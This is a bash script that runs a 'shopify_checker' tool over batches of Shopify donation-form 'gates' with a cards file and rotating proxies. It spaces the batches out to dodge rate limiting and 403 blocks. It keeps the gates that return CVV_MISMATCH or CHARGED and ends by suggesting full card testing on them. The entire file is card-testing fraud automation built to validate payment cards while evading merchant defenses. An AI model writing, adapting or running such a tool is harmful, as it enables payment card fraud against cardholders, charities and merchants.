#!/bin/bash
# Test Gates Safely - Avoid HTTP 403 Errors
# Tests gates in small batches with delays to avoid rate limiting

set -e

echo "════════════════════════════════════════════════════════════"
echo "  Safe Gate Testing - Avoid HTTP 403 Errors"
echo "  Tests gates in small batches with delays"
echo "════════════════════════════════════════════════════════════"
echo ""

# Configuration
BATCH_SIZE=10
DELAY_BETWEEN_BATCHES=300  # 5 minutes
GATES_FILE="full_test_gates.txt"
CARDS_FILE="full_test_cards.txt"
PROXY_FILE="proxies.txt"

# Check files exist
if [ ! -f "$GATES_FILE" ]; then
    echo "❌ Error: $GATES_FILE not found!"
    exit 1
fi

if [ ! -f "$CARDS_FILE" ]; then
    echo "❌ Error: $CARDS_FILE not found!"
    exit 1
fi

if [ ! -f "$PROXY_FILE" ]; then
    echo "⚠️  Warning: $PROXY_FILE not found! Will run without proxies."
    PROXY_ARG=""
else
    PROXY_ARG="--proxy-file $PROXY_FILE"
fi

# Check ChromeDriver
if ! pgrep -f chromedriver > /dev/null; then
    echo "⚠️  ChromeDriver not running. Starting it..."
    chromedriver --port=9515 > /dev/null 2>&1 &
    sleep 2
    echo "✓ ChromeDriver started"
fi

# Count total gates
TOTAL_GATES=$(wc -l < "$GATES_FILE")
echo "Total gates to test: $TOTAL_GATES"
echo "Batch size: $BATCH_SIZE gates"
echo "Delay between batches: $((DELAY_BETWEEN_BATCHES / 60)) minutes"
echo ""

# Calculate number of batches
NUM_BATCHES=$(( (TOTAL_GATES + BATCH_SIZE - 1) / BATCH_SIZE ))
echo "Will process $NUM_BATCHES batches"
echo ""

read -p "Proceed? (y/n): " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "Cancelled."
    exit 0
fi

# Create temp directory for chunks
TEMP_DIR="gate_chunks_$$"
mkdir -p "$TEMP_DIR"

# Split gates into chunks
echo "Splitting gates into batches..."
split -l "$BATCH_SIZE" "$GATES_FILE" "$TEMP_DIR/chunk_"
echo "✓ Created $(ls $TEMP_DIR/chunk_* | wc -l) batch files"
echo ""

# Process each chunk
batch_num=1
total_batches=$(ls $TEMP_DIR/chunk_* | wc -l)

for chunk in $TEMP_DIR/chunk_*; do
    echo "════════════════════════════════════════════════════════════"
    echo "  Batch $batch_num/$total_batches"
    echo "════════════════════════════════════════════════════════════"
    
    gates_in_batch=$(wc -l < "$chunk")
    echo "Testing $gates_in_batch gates..."
    echo ""
    
    # Run the checker
    echo "y" | ./target/release/shopify_checker rotate \
        --gates "$chunk" \
        --cards-file "$CARDS_FILE" \
        $PROXY_ARG \
        --auth-only=true \
        --output "results_batch_$batch_num.json" 2>&1 | tee "log_batch_$batch_num.txt"
    
    echo ""
    echo "✓ Batch $batch_num complete"
    
    # Check for results
    if [ -f "results_batch_$batch_num.json" ]; then
        valid_count=$(cat "results_batch_$batch_num.json" | jq '[.[] | select(.status == "CVV_MISMATCH" or .status == "CHARGED")] | length' 2>/dev/null || echo "0")
        echo "  Found $valid_count valid gates in this batch"
    fi
    
    # Wait before next batch (except for last batch)
    if [ $batch_num -lt $total_batches ]; then
        echo ""
        echo "⏳ Waiting $((DELAY_BETWEEN_BATCHES / 60)) minutes before next batch..."
        echo "   (This avoids rate limiting and 403 errors)"
        sleep "$DELAY_BETWEEN_BATCHES"
        echo ""
    fi
    
    batch_num=$((batch_num + 1))
done

# Combine all results
echo ""
echo "════════════════════════════════════════════════════════════"
echo "  Combining Results"
echo "════════════════════════════════════════════════════════════"

if ls results_batch_*.json 1> /dev/null 2>&1; then
    echo "Merging all batch results..."
    jq -s 'add' results_batch_*.json > combined_results.json
    
    # Extract valid gates
    cat combined_results.json | \
        jq '[.[] | select(.status == "CVV_MISMATCH" or .status == "CHARGED") | {gate: .gate, gateway: "Shopify", donation_form: true}]' \
        > valid_gates.json
    
    VALID_GATES=$(cat valid_gates.json | jq length)
    
    echo "✓ Results combined"
    echo ""
    echo "════════════════════════════════════════════════════════════"
    echo "  Final Summary"
    echo "════════════════════════════════════════════════════════════"
    echo ""
    echo "Total gates tested: $TOTAL_GATES"
    echo "Valid gates found: $VALID_GATES"
    echo "Success rate: $(echo "scale=1; $VALID_GATES * 100 / $TOTAL_GATES" | bc)%"
    echo ""
    echo "Files created:"
    echo "  - combined_results.json (all results)"
    echo "  - valid_gates.json (valid gates only)"
    echo "  - results_batch_*.json (individual batch results)"
    echo "  - log_batch_*.txt (individual batch logs)"
    echo ""
    
    if [ "$VALID_GATES" -gt 0 ]; then
        echo "Sample valid gates:"
        cat valid_gates.json | jq -r '.[0:5] | .[] | .gate'
        echo ""
        echo "✅ Success! You can now test cards on these valid gates:"
        echo "   ./target/release/shopify_checker rotate \\"
        echo "     --gates valid_gates.json \\"
        echo "     --cards-file $CARDS_FILE \\"
        echo "     --auth-only=false"
    else
        echo "❌ No valid gates found."
        echo "   This might mean:"
        echo "   - All gates are invalid"
        echo "   - Proxies are blocked"
        echo "   - Still getting 403 errors"
        echo ""
        echo "   Try:"
        echo "   - Getting fresh proxies"
        echo "   - Increasing delays (edit DELAY_BETWEEN_BATCHES)"
        echo "   - Testing smaller batches (edit BATCH_SIZE)"
    fi
else
    echo "❌ No result files found!"
fi

# Cleanup
echo ""
read -p "Clean up temporary files? (y/n): " -n 1 -r
echo ""
if [[ $REPLY =~ ^[Yy]$ ]]; then
    rm -rf "$TEMP_DIR"
    echo "✓ Cleaned up temporary files"
fi

echo ""
echo "Done!"
